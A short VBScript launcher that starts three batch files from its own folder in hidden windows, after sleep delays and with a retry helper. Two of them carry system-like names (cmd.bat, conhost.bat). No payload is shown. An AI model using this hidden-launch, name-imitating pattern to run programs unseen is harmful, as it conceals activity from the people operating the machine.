Set WShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get script directory
scriptDir = FSO.GetParentFolderName(WScript.ScriptFullName)

' Helper function to launch a command with a built-in retry safeguard
Sub SafeLaunch(command, windowStyle)
    Dim success, attempt
    success = False
    attempt = 1
    
    Do While Not success And attempt <= 2
        On Error Resume Next
        WShell.Run command, windowStyle, False
        
        If Err.Number = 0 Then
            success = True
        Else
            WScript.Sleep 3000
            attempt = attempt + 1
        End If
        On Error GoTo 0
    Loop
End Sub

' Short pause to let system settle
WScript.Sleep 2000

' 1. Launch Script 2 (tb_s_m.bat) - Hidden
batchCommand = chr(34) & scriptDir & "\tb_s_m.bat" & chr(34)
SafeLaunch batchCommand, 0

WScript.Sleep 2000

' 2. Launch cmd.bat - Hidden
cmdCommand = chr(34) & scriptDir & "\cmd.bat" & chr(34)
SafeLaunch cmdCommand, 0

WScript.Sleep 1000

' 3. Launch conhost.bat - Hidden
conhostCommand = chr(34) & scriptDir & "\conhost.bat" & chr(34)
SafeLaunch conhostCommand, 0

Set FSO = Nothing
Set WShell = Nothing
